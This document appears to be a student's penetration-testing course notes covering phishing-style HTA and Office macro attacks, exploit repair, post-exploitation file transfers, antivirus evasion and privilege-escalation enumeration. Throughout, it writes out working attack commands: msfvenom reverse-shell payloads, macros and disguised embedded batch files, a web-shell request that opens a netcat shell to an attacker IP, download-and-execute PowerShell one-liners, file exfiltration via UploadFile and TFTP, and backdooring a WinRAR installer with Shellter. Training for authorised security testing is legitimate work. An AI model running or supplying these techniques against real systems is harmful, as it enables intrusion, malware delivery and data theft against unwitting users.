                our server and [js_php](js_php) will save the fingerprints to
                    `/var/www/html/fp/fingerprint.txt` also all they will see
                    is `You have been given the finger!`
			now we have a client's fingerprint with them getting just an html
                page that we can make look like anything 
        #leveraging html apps
            creating a file with `.hta` instead of `.html`, `IE` will
                interpret it as an `HTML app` and offer to execute it using
                `mshta.exe` this to allow `IE` to execute apps directly instead
                of windows having to download them and then exicute them. So
                an `html app` is executed OUTSIDE of the security context of
                the browser suing Microsoft-signed binary `mshta.exe` works on
                `IE` and some `Edge`. compatible with less secuire legacy such
                as `ActiveX`. So if the brower blocks some feautre `mshta.exe`
                may still beable to execute them.
            #exploring HTML apps
                using `WScript` we can use the function `Windows script host`
                    to get a `windows script host shell` object on tgt by
                    envoking the `Run()` method: [wscript](wscript)
                    when the user brower goes here they will get 2 pop ups
                    asking if they want to run it and will open a `cmd`
                    and an addional window will open.
                we can add `self.close()` to get to close the addional window 
                    after it opens [wscript_host_shell_2](wscript_host_shell_2)
                we need to use `powershell` instead of `run` to get an attack
            #HTA attack in action
                `sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.203 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta` 
                    `-f hta-psh` makes the `hta` output format with powershell [evil_hta](evil_hta)
                        variable names have been randomized to trick detection
                            and anti-virus (AV)
                        `powershell.exe -nop -w hidden -e`
                            `-nop`  NoProfile so user profile isn't loaded
                            `-w hidden` will not create a window on desktop
                            `-e` encoded command, allows the large 64bit
                            encoded command to be ran as direct command line
                            argument
                set up `nc -lvnp 4444` and have user browse to `evil.hta` after
                    they accept 2 warning popups we get a reverse shell!!!
                we could also send it in an email as a link to get around NATed
                    clients
            #exploiting microsoft office
                #microsoft word macro (PWK p.443)
                    can write macros in Visual Basic for Applications (VBA)
                        which is a fully functional scripting lang with access
                        to ActiveX objects and Windows Script Host like
                        JavaScript in HTML apps
                    new word doc > view > macros > name it > macros in dropdown
                        > select the word doc u made > create
                    the `Main` in the macro starts with `Sub` and ends with
                        `End Sub` [empty_macro](empty_macro) `'` comments
                    we need to add `AutoOpen` runs macro on doc opening and
                        `Document_open` runs macro when already opened doc is
                        reopened be fore we add our commands in our `Main` (Sub
                        MyMacro) [macro_opening_cmd](macro_opening_cmd) and 
                        save it as `.docm` or `doc` and AVOID `.docx`
                        save as `Word 97-2003 Document`
                    open the doc and a security warding showing macros have
                        been disabled will be at the top. User needs to click
                        `enable content` to run it. Some environments use 
                        macros and they will be enabled by default. 
                        you get a `cmd` to pop up!!!
                    #powershell
                        VBA has a 255 char limit on str in a macro but doesn't
                            apply to vars. so split the phowershell into mult
                            lines and concatenate with [vbs_str_splitter](vbs_str_splitter)
                            `python vbs_str_splitter.py | xclip -selection clipboard`
                                will send the results to clipboard
                        add `Dim Str as String` in macro `Sub` main above the
                            `CreateObject` [ps_macro_reverse_shell](ps_macro_reverse_shell)
                        `nc -lvnp 4444` and we get a reverse shell!!! A
                            powershell window will pop up on the tgt for just a
                            second and then close. If a doc has been modified
                            that has already had macros enabled and the name
                            hasn't changed, the security warning will not pop
                            up
                    #object linking and embedding
                        patched in 2017, Dynamic Data Echange (DDE) could be
                            used to execute apps form Office docs. However we
                            can still use Object Linking and Enbedding (OLE)
                            instead.
                        windows batch files are older and replaced with vb
                            scripts and powershell. However batch scripts still
                            work
                        create a batch script on windows with: 
                            `echo START cmd.exe > launch.bat`
                        open Word > new doc > incert > object (looks like tiny
                            window) > create from file > browse to `launch.bat`
                            > check display as icon > change icon > by file
                            name click browes > find another apps .exe so it
                            looks like somthing normal > by Caption change the
                            text to somthing like `readme` > ok
                            * C:\Program Files\Microsoft Office\<user>\Office16\EXCEL.exe
                                might be a good one
                        save it as `Word 97-2003 Document` if opened and the
                            tgt double clicks the batch file icon and accepts the
                            secuirty warning, `cmd` will open!
                        #powershell
                            we can use the same powershell payload as before
                                instead of the `launch.bat` above saved as a
                                `.bat` file [ps_reverse_shell_bat](ps_reverse_shell_bat)
                                can make with:
                                `echo powershell.exe -nop -w hidden -e aQB...wA= > ps_reverse_shell.bat`
                                * do not use `""` with this in `cmd`
                            a `cmd` with our ps code will pop up and close give
                                us a shell!!!
                        #evading protected view
                            view email and download link, `protect view` built
                                into windows will block macros and embedded
                                files.
                            send ps_rs_embedding.doc to kali
                            kali: `nc -lnvp 4455 > /var/www/html/ps_rs_embedding.doc`
                            w10: `nc.exe -w 3 192.168.119.203 4455 < C:\Users\admin\Desktop\ps_rs_embedding.doc`
                            and we have it on kali to host and pull down to tgt
                                W10 box
                            so when they download it and open it will start in
                                `protected view`(word and excel) and while this can be enabled,
                                most people will not do this.
                            `microsoft publisher` will not trigger `protected view`
                                however, `publisher` isn't installed very
                                offten. If fingerprinting shows it, use it!!!
#locating public exploits
    https://www.exploit-db.com/
        can check `has app` and if the `A` clolumn is marked with a download
            box, can get the installer for the app we find an exploit too IOT to
            test it off network
        check box `verified` will show known vauled exploits with check marks
            in the `V` column
    https://www.securityfocus.com/
        vuln database that shows vulns but not as many POC exploits
        `references` tab will show POCs or other info needed to find them
    https://packetstormsecurity.com/
        also hosts security tools that might be tailor to a specifict vuln
    #Google search operators
        in kali term: `firefox --search "Microsoft Edge site:exploit-db.com"`
            opens firefox and searches the exploit-db for Microsoft Edge info
        `inurl:`
        `intext:`
        `intitle:`
    #offline exploit resources
        #searchsploit  
            is a downloaded arcive in kali
            `apt update && apt install exploitdb` to update it
            stored in `/usr/share/exploitdb/`
            split into `exploits` and `shellcodes`
            `searchsploit` will bring up useage, look at `notes` for search
            tips. `searchsploit [options] term1 ...termN`
        #Nmap NSE scripts
            stored `/usr/share/nmap/scripts`
            use grep to search it: `nmap Exploits *.nse`
            then to get info on one: `nmap --script-help=clamav-exec.nse`
        #Browser exploitaion framwork (BeEF)
            focused on client-side attaces in a web browser
            `beff-xss` to run and use browser at http://127.0.0.1:3000/ui/panel
                username: beef and password: feeb
            you need to `hook` a tgt webpage but can use demo for example
                and you will see it in the hooked browsers in the left bar.
                Hooked browsers are called `zombies`
            click it to get info on the browser
            `commands tab` has exploits
        #metasploit framework
            `msfconsole -q`
            `search`
                `-h` for help with flags needed!
        #putting it all together
            with `/usr/local/james/bin/run.sh` running on debian
            `nmap 192.168.203.44 -p- -sV -vv --open --reason -oG [44 nmap grep](44.nmap.grep) -oN 44.nmap`
                `-vv` very verbose
                `--open` only show open or possibly open ports
                `--reason` show why a port is open
                `-oG` save as file as grepable
                `-oN` save as file as normal
            [results](results)
            `JAMES` is a service running on 3 ports. lets see what that is
                `firefox --search "james server"`
                we see that its `apache james`
            `searchsploit james`
                we find `Apache James Server 2.3.2 - Remote Command Execution | linux/remote/35513.py`
                which is the same version running on our tgt.
            looking at `35513.py` shows `ip = sys.argv[1]` so the script takes
                an IP as an argument to run and by `payload =` we see that it
                will attempt to exploit as root
            `python 35513.py 192.168.203.44` runs and works tells us that the
                payload will be delivered next time a user logs in.
            ssh into the box to simulate a user loggin in
            the exploit creates a `proof.txt` in the root dir to show it worked
#fixing exploits
    #memory corruption 
        like buffer overflows which should:
            * create large buffer to trigger overflow
            * take control of EIP by padding buffer with offset
            * have payload prepended by optional NOPS
            * pick return address such as JMP ESP to redirect exectuion flow to
              the payload
        clone the tgt enviornmanet and app in a VM and test modified exploits
            think about replacing the shell code if its encoded so we don't
            have to reverse enginner it.
        #examining the exploit
            * example is sync breeze enterprise 10.0.28
            `searchsploit "sync breeze enterprise 10.0.28"`
                use the `42341.c`
            we might have to use this C code instead of python if we are in an
                enviornment that doesn't have python installed.
            python is a scripting lang while C is not so concatanating str will
                not work and C needs to be complied first and then ran
            `searchsploit -m 42341` will use `-m mirror` to copy the exploit to
                our current dir
            when see vim the file we see headers:
                `#include <insock2.h>`
                `#include <windows.h>`
                so exploit is ment to be complied on windows
        #cross-compliling exploit code
            `apt install mingw-w64` to install it
            compile the exploit.c to ensure there are no errors
            `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe`
                `-o` output file
                it errors. googling `WSAStartup mingw32` reveals its a function in
                `winsock.h` and errors happen when the linker can't find
                the winsock lib so adding `-lws2_32` will fix it
            `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`
                it compiles!!!
        #changing socket info
            search for `ip` (`inet_addr`) and `port` to change them
                ex. 192.168.203.10 and port 80
        #changing return address
            check the return address to be sure its a `.dll` that is part of
                the vuln software. search for `retn` or `ret`
            attach Debugger to the tgt sof then View > Executable Modules to
                see if exploit `.dll` is here. if not we need a new return
                address.
            find a new `.dll` with `mona` or if we have access to the tgt, even
                unprivlaged, we can copy the `.dll`s and find a return address with
                `msfpescan` ran on the `.dll`. From inside `msfconsole` 
                run `msfpescan` for help
                * addresses need to be in reverse order!!!
        #changing the payload
           seems the `shellcode` var seems to hold the payload. It is encoded
               and hard to understand. However, the hint we get is the comment for
               `//NOP SLIDE`
           We want to generate our own payload to ensure its safe.
           `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"` 
                and use our code to replace the old after the NOPS.
           compile for error checking: `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`
        #testing the exploit
            set up `nc -lvnp 443`
            because the exploit is cross-complied on kali to run on windows
                we need to use `wine` which is compatibility layer capable of
                running windows apps on linx, bsd, and MacOS.
                `apt install wine`
                `dpkg --add-architecture i386 && apt-get update && apt-get install wine32`
            then run the exploit `wine syncbreeze_exploit.exe`
            we see that it fails and our `EIP` is which is to our `JMP ESP` at 
                0x9010090c` which is off by 1 byte. we need to fix it.
        #changing the overflow buffer
            [42341_c](42341_c) on line 70, we see the buffer size is set to
                780 and this is the right offset. However, later in line
                112-118, we see that `strcpy` and `strcat` are used to make the
                buffer. In `C` `str`s are ended with a null byte `\x00` so this
                will really make our buffer one `A` short of the offset because
                the 780th place isn't sent the program becuase `C` hits a null byte and doesn't pass it to the app. Simply increase our buffer
                size on line 70 by 1.
            recomplie and run with `wine` to get a shell!!!
    #fixing web exploits
        #considerations
            * Does it initiate an HTTP or HTTPS connection?
            * Does it access a web application specific path or route?
            * Does the exploit leverage a pre-authentication vulnerability?
            * If not, how does the exploit authenticate to the web application?
            * How are the GET or POST requests crafted to trigger and exploit the
            vulnerability?
            * Does it rely on default application settings (such as the web path of
            the application) that may
            have been changed after installation?
            * Will oddities such as self-signed certificates disrupt the exploit?
        #this ex.
            found a linux host with apache2 exposed running CMS Made Simple
                version 2.2.5 running TCP 443. Found post-authentication
                exploit on exploitdb and we had found creds earlyer for this
                box on another one. https://www.exploit-db.com/exploits/44976
        #changing connectivity info
            the var `base_url` is our target and needs to be changed to
                `"https://192.168.203.44/admin"` because we see that CMS is
                running on https and the admin login screen is at `/admin`
            when going to the page we see that the cert isn't validated and my
                be locally signed. `error code: SEC_ERROR_UNKNONW_ISSUER`
            exploit imports the `requests` lib so the exploit talks to the app
                via web requests and sends 3 of them. Line 34 `requests.post`
            to get the exploit to ignore the warning of the self signed cert,
                we can tell it not to verify by adding it to line 34:
                `response  = requests.post(url, data=data, allow_redirects=False, verify=False)`
            the other 2 requests are 55 and 80 and need `verify=False` added
                aswell.
            add the creds we found on line 15,16L `admin:HUYfaw763`
            the payload, line 21, is just running system cmds with the get
                request in plain text so we can use this or change the payload.
            when ran we get an error: 
                File "44976.py", line 24, in parse_csrf_token
                    return location.split(csrf_param + "=")[1]
                    IndexError: list index out of range
                Which says that it tryed to access the 2nd element of a python
                    list that isn't there
            #troubleshooting "index out of range" error
                line 24: `return location.split(csrf_param + "=")[1]`
                    `split` method is used to slice the str stored at
                    `location` parm of `parse_csrf_token`
                in python, `split` slices input str using optional separator
                    passed as the first arg. the str slices returned are stored
                    in an index and can be called with a number.just run `python`
						Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
						[GCC 9.3.0] on linux2
						Type "help", "copyright", "credits" or "license" for more information.
						>>> mystr = "first-second-third"
						>>> result = mystr.split("-")
						>>> result
						['first', 'second', 'third']
						>>> result[2]
						'third'
						>>> 
                in `44976` str separator is defined as `csrf_param` var of
                    `"__c"` followed by `=` on lines 18 and 24
                in the `parse_csrf_token()` function add a print startment
                    before `return` to see what its doing:
                    `print "[+] String that is being split: " + location`
                when ran we get:`[+] String that is being split: https://192.168.203.44/admin?_sk_=d47d6798c49160fa7e9`
                    the exploit expected to see `__c` but got `_sk_` instead
                    from the web server
                we can just change the `csrf_parm` var to match the `_sk_` that
                    we are getting
                it works and gives us a shell at: `https://192.168.203.44/uploads/shell.php`
                `curl -k https://192.168.203.44/uploads/shell.php?cmd=whoami`
                    to run `whoami`
                #get fully interactive shell
                    from curl it won't work because of the way http works via a
                        terminal and has issue with the `GET` requests so use
                        the browser instead
                    from the browser:
                        https://192.168.203.44/uploads/shell.php?cmd=nc%20-nv%20192.168.119.203%204444%20-e%20/bin/bash
                        and catch with `nc -lvnp 4444`
                        then upgrade the shell with: 
                            `python -c 'import pty; pty.spawn("/bin/bash")'`
                            to get an upgraded shell!!!
#file transfers post exploitation
    Post exploitation - actions perfomred after gaining some level of contorl
        on tgt to include: elevating privs, expanding contorl of other mechines,
        installing backdoors, cleaning up evidence, uploading files and tools, ect.
    #dangers of transffering attack tools
        AVs could see our tools and files, so try to use native tools
    #Pure-FTPD
        [setup_pure_ftpd](setup_pure_ftpd) set username:password as `offsec:ftp`
        
    #non-interactive shell
        lack useful features like tab complete and job control
        `ls` works becuase it compeltes with NO user interaction
        ssh to debian client and then connect to kali ftp with 
            `ftp 192.168.119.203` and use `offsec:ftp` to login
        `bye` to exit
            this is interactive
        to get `non-interactive` shell
            ssh into debian, set up bind shell
                debian: `nc -lvnp -e /bin/bash`
                kali: `nc -nv 192.168.203.44 4444`
            then from our bind shell on kali, `ftp 192.168.119.203`
            we are connected to ftp but are not getting feedback
            * non-interactive becuase`ftp` isn't redirected correctly 
                in a `bind` or `reverse shell`
    #upgrading non-interactive shell
        `python -c 'import pty; pty.spawn("/bin/bash")'`
            will spawn a sudo terminal
        this will give us an interactive shell via non-interactive channel
    #non-interactive ftp download windows
        windows ships with default ftp client
        ex. have access to windows bind shell `nc.exe -lvnp -e cmd.exe`
            kali: `nc -nv 192.168.203.10 4444`
        if we want use `ftp` via the bind shell we need `ftp -h`
        `-s:filename` will allow for ftp cmds to be send so we can do things
            with it being non-interactive
        ex. add `nc.exe` binary to kali ftp server for download
            `cp /usr/share/windows-resources/binaries/nc.exe /ftphome/`
        restart `pure-ftpd` to besure its working `systemctl restart pure-ftpd`
        build txt file one windows tgt with the ftp cmds we want on 
            the tgt windows mechine:
                ```
                echo open 192.168.119.203> ftp.txt
                echo USER offsec>> ftp.txt
                echo ftp>> ftp.txt
                echo bin >> ftp.txt
                echo GET nc.exe > ftp.txt
                echo bye >> ftp.txt
                ```
             will `open` the ip in ftp, use `USER` and then ftp as password, then
                 request a binary file transfer with `bin` and issue the `GET`
                 request for `nc.exe` and then close the connection.
             `ftp -v -n -s:ftp.txt`
                `-v` to surpress output
                `-n` to surpress auto login
             will download the binary to the windows tgt from our ftp server
             * this may trigger windows defender firewall rules
    #windows downloads using scripting languages
        #wget.vbs
            `cp /usr/share/windows-resources/binaries/wget.exe /var/www/html`
                so we have `wget.exe` on our ftp server for windows to download
                    but the `wget.vbs`  will download any file
                * don't forget to start apache2 !!!
            create a [wget vbs](wget.vbs) by coping its contents to the windows shell
            `cscript wget.vbs http://10.11.0.4/wget.exe evil.exe`
                will download `wget.exe` and change its name to `evil.exe`
                * `evil.exe -V` will head the file in windows shell
        #system.net powershell class
            copy echo commands to windows shell from [wget_ps1_txt](wget_ps1_txt)
			`powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1`
                `-ExecutionPolicy Bypass` allows for exeuciton of ps scripts
                `-NoLogo -noninteractive` to suppress logo and interactive
                    window
                `-NoProfile` will not load a user profile
            as a one liner:
                `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.203/wget.exe', 'new-exploit.exe')`
        #download and run prowershell script without saving to disk
            using download string method and IEX command let
            [helloworld ps1](helloworld.ps1) hosted on kali apache
            `powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.203/helloworld.ps1')`
        #downloads with exe2hex and powershell
            compress binary, convert to hex, and make a windows script,
                paste script in windows shell to redirect hex data into
                powershell.exe to asemble it back into a binary
            `locate nc.exe | grep binaries`
                to find `nc.exe` on kali
            `cp /usr/share/windows-resources/binaries/nc.exe .`
                copy it to current dir
            `ls -lh nc.exe `
                to see its size of 58K
            `upx -9 nc.exe`
                `upx` is a exacutable packer (PE compression tool) to reduce
                    by 50% and can still be ran as normal
            `exe2hex -x nc.exe -p nc.cmd`
                to convert to hex
            `head -n 3 nc.cmd`
                shows that it consists mostly of `echo` cmds (non-interactive)
            `tail nc.exe`
                shows at the end that `nc.exe` will be rebuilt on tgt
            `cat nc.cmd | xclip -selection clipboard`
                will copy to clipboard like `pbcopy` will
            Then paste to windows bind shell and it is on the system
    #windows uploads using windows scripting languages
       might need to exfil data from windows client tgt and can't install
           additional software
       * if outbound http is allowed use `System.Net.WebClient` powershell
           class to upload data to Kali via `HTTP POST request`
       ex. going to upload `evil.exe` from windows to kali
       [uploads_via_http_post](uploads_via_http_post) stored on kali in `/var/www/html` so our windows 
           tgt can connect to apache  with `UploadFile()` and use it to
           upload a file to `/var/www/uploads`
		   `mkdir /var/www/uploads`
           `ps -ef | grep apache`
                apache uses the www-data user and our script will save with
                that user so we need to change the permissions of our new dir
                from root to www-data
		   `chown www-data: /var/www/uploads`
       paste in windows shell: 
       `powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.203/upload_via_http_post.php', 'evil.exe')`
           uses our php script on kali apache server to give directions for
           UploadFile on where to store our tgt file
    #uploading files with TFTP
        can transfer files on older windows and up to XP and 2003
        setup:
            `apt install atftp`
            `mkdir /tftp`
            `chown nobody: /tftp`
            `atfpd --daemon --port 69 /tftp`
                runs atfpd as a daemon on UDP port 69 and server files from
                /tftp
        in windows shell: `tftp -i 192.168.119.203 put evil.exe`
            will connect to tftp and use `put` to upload file to kali
            windows shell may hang or say no connection but it does transfer
            becuase its over UDP and will not get a confirm packet back
#Antivirus Evasion
    AV is an app to prevent, detect, and remove malware
    #methods of detecting malicious code
        `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f exe > binary.exe`
            to make a common malware and scan it with https://www.virustotal.com/gui/
            to see which AVs will detect it but saves its hash as public
        transfer to windows for analysis:
            windows: `nc.exe -lvnp 4455 > C:\Users\admin\Desktop\binary.exe`
            kali: `nc -w 3 192.168.203.10 4455 < ~/workspace/binary.exe`
    #detection methods
        `signature based` is a blacklist tech: scans for known malware
            signatures  nd quarantines them. Can bypass by changing or obfuscating
            contents of malcode
        `heuristic-based` uses rules or algorithms to determine if actions are
            malicious. Done by stepping thru instruction set of a binary or
            attempting to decomplie and then analyze the source code to look
            for patthern or porgram calls
        `behaviour-based` running the code in a sandbox or vm and look for
            behaviors or actions that are malicious. `heuristic` and `behaviour`
            can detect brand new malware not seen before.
        Most AVs use a combo of all
    #bypassing antivirus detection
        `On-Disk` and `In-Memory` are the two ways.
        #On-Disk
            modifying malicious files physically store on disk
            1. packers such as `upx` to compress and change the signature
            2. obfuscators reorganize and mutate code to make it hard to
               reverse engineer such as repaceing cmds with similar ones
            3. crypters alters code by adding a decryptoing stub that restores
               original code on execution. decryption happens in-mempry leaving
               just encrypted code on disk. One of the most effective
            4. software protectors such as `The Enigma Protector` to evade AV
        #In-Memory injection
            or `PE injection` is manipulating volatile memory and never saves
                anything to disk.
            1. remote process memory injection: inject payload into another PE
               leveraging a set of windows APIs using `CreateRemoteThread` API. 
            2. reflective DLL injection: loads a DLL stored in memory. However,
               attempts to load a DLL stored by the attacker in the process
               memeory. `LocalLibrary` does not support loading DLL from memory
               and Windows does not expose APIs that can handle this either.
               Attackers need to write their own version of the API that
               doesn't rely on disk-based DLL
            3. Process Hollowing: first launch normal process in suspended
               state, remove the image from  memory and replace with malicious 
               executable image, then resume.
            4. Inline Hooking: modifying memory and introducing a hook that
                   (redirect code execution) into a function to point the
                   execution flow to our malicious code.
        #AV Evation: practical example
            install `avira antivirus 15.0.34.16` from tools on windows
            set realtime protection to on
            test to besure its working by running an exploit `binary.exe`
                should give us an error and popup saydin git was quarantined
            #powershell In-Memory injection
                powershell can interact with windows API and impliment
                    im-mempory injection process in a powershell script
                executing a script instead of a PE makes it hard for AV to flag
                    it because it runs inside an interpreter and the script
                    itself isn't executable code.
                even if the script is marked as malware, it can be changes
                    easyly.
                [in_memory_injection_ps1](in_memory_injection_ps1) with no payload
                    script imports `VitualAlloc` and `CreateThread` from
                    `kernel32.dll` and `memset` from `msvcrt.dll`. These allow
                    us to alocate memory, create an execution thread, and
                    write data to that memory. This is allocating memory and
                    executing a new thread in the current process of
                    powershell.exe instead of a remote one.
                `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.203 LPORT=4444 -f powershell`
                    and copy eveything past `$buf =` and add to line 17 of
                        in_memory_injection_ps1
                after checking in virus total only 19/59 detected it
                    then check it with in a VM with AV we are trying to beat, Avira
                transfer file to Windows with Avira:
                    w10: `nc.exe -nvlp 4455 > C:\Users\admin\Desktop\rs_in_memory_injection.ps1 `
                    kali: `nc -w 3 192.168.203.10 445 < rs_in_memory_injection.ps1`
                if scan is good, run it on tgt windows box: `powershell .\rs_in_memory_injection.ps1`
                    get an error: `Execution_Policies` will not let us run it
                    becuase powershell is on a per user not per system basis.
                #change execution_policies for current user
                    `powershell`
                    `Get-ExecutionPolicy -Scope CurrentUser `
                        Undefined means we can't run it
                    `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`
                        sets user to Unrestricted
                    This is a whole policy change, we could just bypass the
                        ExecutionPolicy with bypass flag: `-ExecutionPolicy Bypass` 
                        when we run the script
                    because we made our payload with `meterpreter` we need to
                        start a `meterpreter handler` on our kali box to catch
                        it
                    `msfconsole`
                    `use exploit/multi/handler`
                    `set payload windows/meterpreter/reverse_tcp`
                    `set lhost 192.168.119.203`
                    or you can set it up with a single command
                        `msfconsole -x "use exploit/multi/handler; set RHOST 192.168.203.10; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.203"`
                    run exploit on windows tgt and get a meterpreter shell!!!
                        `getuid` is whoami
                #run powershell script as onliner
                    can use the same powershell script as above
                    will be encoded in base64 so you can send as oneliner
                    use `ps_encoder.py` from https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py
                    `python ps_encoder.py -s reverse_shell.ps1`
                        `-h` for help, `-s` for powershell script
                    copy output to include `=` at the end
                    in cmd on tgt: `powershell.exe -encodedCommand JABj...ACgA=`
                        to run and get reverse shell
        #Shellter            
            dynamic shellcode injection tool capable of bypassing AVs that can
                backdoor a non-malicious executable with malicious payload
            `apt-cache search shellter`
            `apt install shellter`
            shellter will start a new console running under wine
            in case `Auto` options fail, use `Manual` to make smaller changes
            `target PE` the executable we want to hide in
                ex. https://www.rarlab.com/download.htm 32bit
            if we have `wrar601.exe` in root's home:
                target PE: `/root/wrar601.exe`
            this might take a min
            `enable stealth mode?` will restore the original execution so after
                our payload is ran, the execuatble will finish normally to
                redue user suspition
            `payloads` will give us a list or we can use a custom payload.
            * custom payloads will need to terminate by exiting the current
              thread if stealth mode is on
                `L` to used a listed one and for ex. use `1`
            set `LHOST` and `LPORT`
            if it `verified!` then it reached the 1st instruction of the
                payload
            the original file is our new shelltered file
            scan with AV, send to tgt, run, program will install normally and
                get a meterprater shell that dies as soon as install is
                complete. Can fix with adding an `AutoRunScript` to migrate our
                meterpreter session as soon as its created.
            in `metasploit` after we set options: 
            `set AutoRunScript post/windows/manage/migrate` then run again
            we get a meterpreter shell that will stay up!!!!
#privilege Escalation
    going from standard or non-privileged user to getting root privs
    look for: misconfigured services, insufficient file permission restrictions
        on binaries or services, direct kernel vulnerabilities, vulnerable software running with
        high privileges, sensitive information stored on local files, registry settings that always elevate
        privileges before executing a binary, installation scripts that may contain hard coded credentials, and
        many others.
    #info gathering
        to find privEsc vectors
    #manual enumeration
        Ex. ssh as student to debian and windows. On W10 > search > services >
            OpenSSH SSH Server > start
        #enum users
            `whoami` works on both to get current user
            * get more info about a user like groups
                w `net user <name>`
                u `id`
            * find out other users on box
                w `net user`
                u `cat /etc/passwd` shows all users and services accounts.
                    accounts with 1000+ UIDs are user created ones. `www-data`
                    is a web server
        #enum hostname
            `hostname` gets current hostname
                give us clues to its purpose
        #enum OS version and architecture
            if we use `kernel exploits` we need to know exactly the tgt or we
                might have a system crash
            * w BROKEN over SSH: `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
                INSTEAD you need an unpriv `nc` session for the cmd to work
                `x86` is 32-bit
            * u `cat /ect/issue` and `cat /etc/*-release`: for OS version
            * u `uname -a`: for kernal and architecture
        #enum running processes and services
            * w BROKEN over ssh: `tasklist /SVC` return processes mapped to
                  specific Windows service doesnt show priv user processes
            * u `ps axu` includes root services `ax` all processes with our
                  without `tty` and `u` for user readable
        #enum networking info
            a priv services or process listening on a loopback could expand our
                attack surface. Also other connections means we might could
                piviot from this tgt to another
            * w `ipconfig /all` `/all` shows config for all adapters
            * w `route print`
            * w `netstat -ano` `-a` all TCP connections `-n` address and port
                  `-o` owner of connection in PID
            * u `ip a` see all config of all adapters
            * u `/sbin/route` or `/sbin/route -l` to see routes, takes a min
            * u `ss -anp` or `netstat -anp` flags `-a` all `-n` avoid hostname
                res `-p` processes name
        #enum firewall status and rules
            if network service is not remotely accessible becuase it is blocked
                by firewall, generally accessible locally via loopback interace and
                mabe escalate privs on local system
            * w `netsh advfirewall show currentprofile` to see if firewall is
                  active (if this borks term us NC or ssh <command>)
            * w `netsh advfirewall firewall show rule name=all`
                look for ones that are enabled and allow for remote connections
                in and out
            in linux you need root to see firewall rules w/ iptables
                however,  `iptables-persistent` saves rules in specific files
                uner `/etc/iptables` with weak permissions. Also any files
                created by `iptables-save` cmd and ran would be in `/etc` and
                if it has weak permissions we could infer the FW config
            * u `grep -Hs iptables /etc/*`
                `-H` show file name `s` to suppress errors. If we find somthing
                like `iptables-backup` we can `cat` it and see some firewall
                rules
        #enum scheduled tasks
            * w `schtasks /query /fo LIST /v`
                `/query` displaays tasks `/fo list` output to simple list
                `/v` verbose
            * u `ls -lah /etc/cron*`
                list all cron jobs by how often they are run
            * u `cat /etc/crontab`
                user added jobs, most can run as root and if files have loose
                permissions we can manipulate them.
        #enum installed apps and patch levels
            need to know all apps and versions to find an exploit to escalate
                our privs
            on windows we need to know the OS patch level aswell
            * w `wmic product get name, version, vendor`
                `product get` to get property values `name, version, vender`
                give us that info. Only returns apps installed by windows
                installer and takes a few mins
            * w `wmic qfe get Caption, Description, HotFixID, InstalledOn`
                `hotfixid` gives ID `installedon` is the date 
            Linux uses different package managers
            * u `dpkg -l` for debian to show list of installed apps
        #enum readable/writable files and directories
            files w/ insufficient access restrictions can create a vuln to
                elevate privs. most offten when we modify scripts or binarys
                that execute under the context of a privileged account
            on `windows` the `SysinternalSuite` can be used to automate looking
                for these files and dirs. but you need to put it on the mechine
                and ran from the `SysinternalSuite\` dir:
                * w `accesschk.exe -uws "Everyone" "C:\Program Files"`
                    `-u` suppress errors `-w` for write permissions `-s`
                    recursive `"Everyone"` group
            use `powershell` to do the same
                * w `powershell` MUST be in a powershell for it to work!
                * w `Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}`
                    `Get-ACL` get all permissions for a file `Get-ChildItem "C:\Program Files"`
                    enum everything in program files first because Get-ACL isnt
                    recursive `AccessToString -match` will specific access
                    properties of the following `"Everyone\sAllow\s\sModify"`
                    everyone group
            * u `find / -writable -type d 2>/dev/null`
                    to find writable by current user `writable` is what 
                    we want `-type d` for dirs
        #enum unmounted disks
            easy to overlook unmounted disks by tgt that might contain info. If
                we find one check th emount permissions
            * w `mountvol`
                to see at the bottom mounted and `NO MOUNT POINTS` drives
            * u `mount`
            * u `cat /etc/fstab`
                shows mounts at boot, find a swap?
            * u `/bin/lsblk`
                show all disks, could find unmounted partions
        #enum device drivers and kernel modules
            * w `powershell` MUST be in powershell shell
            * w `driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path`
                `driverquery.exe /v /fo csv` verbose and in csv format
                `ConvertFrom-CSV` and `Select-Object` to just give us the 3
                columns we want. does NOT work with reverse cmd shell via nc
                but DOES on the windows cmd via rdesktop. also broke over ssh
            * w `Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}`
                `DriverVersion` gives us versions and `Where-Object` lets us
                search for a specific device inside the `" "`
            * u `lsmod`
                to see all modules
            * u `/sbin/modinfo <mod>`
                to get more info on that particultar module
        #enum binaries that AutoElevate
            * w `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
                if current user has a registry key or value set to `1` it will show.
                `AlwaysInstallElevated` we could craft a `MSI` file and run it
                and elevate our privs
            * w `reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`
                to check same for mechine
            * u `find / -perm -u=s -type f 2>/dev/null`
                search for `SUID` files. an executable gets the prmission of
                user running it. However, if the `SUID` bit is set, binary will
                run with the permisions of the file owner and if owned by root,
                has root privs. `-perm -u=s` searches for `SUID` bit set
                `tpye f` means files
                
    #automated Enumeration
        * w `windows-privesc-check2.exe -h` for help
